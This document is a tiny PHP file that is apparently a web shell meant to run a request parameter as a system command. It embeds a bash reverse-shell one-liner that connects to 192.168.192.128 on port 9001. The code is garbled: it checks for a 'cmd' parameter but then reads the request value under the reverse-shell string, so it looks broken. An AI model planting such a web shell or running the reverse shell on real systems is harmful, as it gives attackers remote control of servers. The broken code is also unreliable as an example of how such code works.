<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['/bin/bash -i >& /dev/tcp/192.168.192.128/9001 0>&1']) . "</pre>";
}
?>
